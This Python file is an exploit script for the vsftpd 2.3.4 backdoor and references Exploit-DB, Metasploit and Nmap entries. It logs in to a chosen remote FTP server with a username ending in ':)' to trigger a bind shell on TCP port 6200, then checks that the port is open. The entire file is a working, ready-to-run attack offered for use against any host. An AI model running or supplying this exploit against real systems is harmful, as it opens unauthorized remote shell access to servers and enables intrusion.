import socket
import argparse
import ftplib
import logging


logging.basicConfig(format='%(message)s')

"""
Info
---------------
Exploit DB: https://www.exploit-db.com/exploits/17491/
Metasploit: https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor
NMAP script: https://nmap.org/nsedoc/scripts/ftp-vsftpd-backdoor.html
"""

DESCRIPTION = """
Logging in with any username containing the `:)` character pair and any password will open a tcp bind shell backdoor on the same host at TCP port 6200
"""


parser = argparse.ArgumentParser(description=DESCRIPTION)
parser.add_argument('rhost', metavar='RHOST')
parser.add_argument('--rport', default=21)
parser.add_argument('--ftp-user', default='X')
parser.add_argument('--ftp-pass', default='X')
parser.add_argument('--log-level', default='INFO', dest='log_level')
parser.add_argument('-c', '--check', action='store_true')


def check(rhost, **kwargs):
    logging.info('Checking...')
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM, socket.SOL_TCP)

    try:
        sock.connect((rhost, 6200))

        logging.info('VULNERABLE!')
        sock.close()

        return True
    except ConnectionRefusedError:
        logging.error('NOT VULNERABLE')
        return False


def main():
    args = parser.parse_args()
    args.ftp_user += ':)'

    logging.getLogger().setLevel(getattr(logging, args.log_level))

    logging.debug('Creating client...')
    client = ftplib.FTP(timeout=3)
    logging.debug('Client created')

    logging.debug('Connecting to FTP at {}:{}...'.format(args.rhost, args.rport))
    client.connect(host=args.rhost, port=args.rport)
    logging.debug('Connected')

    logging.info(client.getwelcome())

    logging.info('Opening backdoor at {}:6200'.format(args.rhost))

    try:
        logging.debug('Logging in with username: {} and password:{}...'.format(args.ftp_user, args.ftp_pass))
        client.login(user=args.ftp_user, passwd=args.ftp_pass)
        client.quit()
    except socket.timeout:
        client.close()
        if args.check:
            check(**vars(args))


if __name__ == '__main__':
    main()
